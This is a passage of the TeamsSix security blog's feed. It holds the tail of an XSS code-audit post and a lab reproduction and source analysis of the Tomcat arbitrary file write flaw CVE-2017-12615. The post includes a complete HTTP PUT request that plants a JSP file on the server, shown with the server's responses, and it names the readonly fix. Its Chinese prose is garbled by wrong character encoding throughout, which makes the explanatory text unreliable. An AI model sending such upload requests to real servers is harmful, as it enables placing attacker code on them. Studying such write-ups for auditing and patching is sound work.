punctuation">"</span>avatar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_res.title&#125;<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;rurl&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;_res.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>slogan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;website.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>${website.title} è¿™ç§å†™æ³•ä¹Ÿæ²¡æœ‰åšè½¬ä¹‰ï¼Œä¹Ÿæˆä¸ºäº†è§¦å‘ XSS çš„ä¸€ç¯ã€‚</p><blockquote><p>åŸæ–‡é“¾æ¥ï¼š</p><p><a href="https://www.teamssix.com/211220-164519.html">https://www.teamssix.com/211220-164519.html</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-åå°„å‹-XSS&quot;&gt;&lt;a href=&quot;#0x01-åå°„å‹-XSS&quot; class=&quot;headerlink&quot; title=&quot;0x01 åå°„å‹ XSS&quot;&gt;&lt;/a&gt;0x01 åå°„å‹ XSS&lt;/h1&gt;&lt;p&gt;ä»¥ä¸‹ä»£ç å±•ç¤ºäº†åå°„å‹ XSS æ¼æ´äº§ç”Ÿçš„å¤§æ¦‚å½¢å¼&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘Tomcat ä»»æ„æ–‡ä»¶å†™å…¥ CVE-2017-12615</title>
    <link href="https://www.teamssix.com/211216-172616.html"/>
    <id>https://www.teamssix.com/211216-172616.html</id>
    <published>2021-12-16T09:26:16.000Z</published>
    <updated>2021-12-16T09:38:29.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç¯å¢ƒæ­å»º"><a href="#0x00-ç¯å¢ƒæ­å»º" class="headerlink" title="0x00 ç¯å¢ƒæ­å»º"></a>0x00 ç¯å¢ƒæ­å»º</h1><p>ç›´æ¥ Docker æ­å»ºå³å¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span class="token builtin class-name">cd</span> /vulhub/tomcat/CVE-2017-12615<span class="token function">sudo</span> docker-compose build<span class="token function">sudo</span> docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x01-æ¼æ´å¤ç°"><a href="#0x01-æ¼æ´å¤ç°" class="headerlink" title="0x01 æ¼æ´å¤ç°"></a>0x01 æ¼æ´å¤ç°</h1><p>ç›´æ¥ä½¿ç”¨ PUT å‘èµ·è¯·æ±‚å°±å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¯”å¦‚å‘ /teamssix.jsp/ å‘èµ·è¯·æ±‚</p><pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;teamssix.jsp&#x2F; HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeContent-Length: 26&lt;%out.print(&quot;TeamsSix&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 201 Content-Length: 0Date: Wed, 15 Dec 2021 07:19:29 GMTConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯è¿”å› 201 è¯´æ˜åˆ›å»ºæˆåŠŸï¼Œè®¿é—® /teamssix.jsp å¯ä»¥çœ‹åˆ°æ–‡ä»¶æˆåŠŸè¢«ä¸Šä¼ </p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;teamssix.jsp HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 Set-Cookie: JSESSIONID&#x3D;128419889W27F6C930EF27082B98D9FD; Path&#x3D;&#x2F;; HttpOnlyContent-Type: text&#x2F;html;charset&#x3D;ISO-8859-1Content-Length: 8Date: Wed, 15 Dec 2021 07:19:35 GMTConnection: closeTeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112161721745.png"></p><h1 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h1><p>Tomcat åœ¨å¤„ç†æ—¶æœ‰ä¸¤ä¸ªé»˜è®¤çš„ Servletï¼Œåˆ†åˆ«ä¸º DefaultServlet å’Œ JspServletï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.catalina.servlets.DefaultServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>listings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>â€¦â€¦ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.jasper.servlet.JspServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>fork<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>xpoweredBy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>â€¦â€¦    <span class="token comment">&lt;!-- The mapping for the default servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- The mappings for the JSP servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jspx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»é…ç½®æ–‡ä»¶é‡Œå¯ä»¥çœ‹åˆ°å¯¹äºåç¼€ä¸º .jsp å’Œ .jspx çš„è¯·æ±‚ç”± JspServlet å¤„ç†ï¼Œè€Œå…¶ä»–çš„è¯·æ±‚åˆ™ç”± DefaultServlet å¤„ç†ã€‚</p><p>æ‰€ä»¥å½“è¯·æ±‚ /teamssix.jsp æ—¶å°†ä¼šç”± JspServlet å¤„ç†ï¼Œæ— æ³•è§¦å‘æ¼æ´ï¼›è€Œè¯·æ±‚ /teamssix.jsp/ å°†ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œäº¤ç”± DefaultServlet å¤„ç†ï¼Œè¿™æ—¶å°±å¯ä»¥è§¦å‘æ¼æ´äº†ã€‚</p><p>è¦æƒ³å®ç°ä¸€ä¸ª Servletï¼Œå°±éœ€è¦ç»§æ‰¿ HTTPServletï¼Œæ‰¾åˆ° HTTPServlet æ–‡ä»¶ä¸º /tomcat/lib/servlet-api.jar!/javax/servlet/http/HttpServlet.class</p><p>åœ¨ HTTPServlet ä¸­æ‰¾åˆ° doPut æ–¹æ³•ï¼Œç„¶åæ‰¾åˆ° DefaultServlet é‡Œé‡å†™çš„ doPut æ–¹æ³•è·¯å¾„ä¸ºtomcat/lib/catalina.jar!/org/apache/catalina/servlets/DefaultServlet.class</p><p>æŸ¥çœ‹ DefaultServlet çš„ doPut æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPut</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readOnly<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRelativePath</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebResource</span> resource <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultServlet<span class="token punctuation">.</span>Range</span> range <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseContentRange</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> resourceInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>range <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">File</span> contentFile <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">executePartialPut</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> range<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>                resourceInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>contentFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resourceInputStream <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">204</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resourceInputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ä¸Šé¢ä»£ç çš„ç¬¬ 2 è¡Œå¯ä»¥çœ‹åˆ°é¦–å…ˆåˆ¤æ–­ readOnly æ˜¯å¦ä¸ºçœŸï¼Œå¦‚æœä¸ºçœŸåˆ™è¿”å› 403ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æŠŠ web.xml é‡Œçš„ DefaultServlet çš„ readonly ç”±åŸæ¥çš„ false æ”¹ä¸º true å°±èƒ½é˜²å¾¡è¿™ä¸ªæ¼æ´äº†ã€‚</p><p>ç»§ç»­å›åˆ° DefaultServlet.class é‡Œï¼Œåœ¨ DefaultServlet.class é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ª write å‡½æ•°ï¼Œé€šè¿‡è¿™ä¸ª write å‡½æ•°ä»£ç è·Ÿè¸ªåˆ° tomcat/lib/catalina.jar!/org/apache/catalina/webresources/DirResourceSet.class é‡Œçš„ write å‡½æ•°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">InputStream</span> is<span class="token punctuation">,</span> <span class="token keyword">boolean</span> overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkPath</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>is <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"dirResourceSet.writeNpe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isReadOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> dest <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> webAppMount <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getWebAppMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dest <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">file</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dest <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dest<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">StandardCopyOption</span><span class="token punctuation">.</span>REPLACE_EXISTING<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æ‰§è¡Œåˆ°<code>dest = this.file(path.substring(webAppMount.length()), false); </code> æ—¶ï¼Œpath ä¼šä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œæ‰§è¡Œ file æ–¹æ³•ï¼Œfile æ–¹æ³•éƒ¨åˆ†ä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">File</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> mustExist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">File</span> file 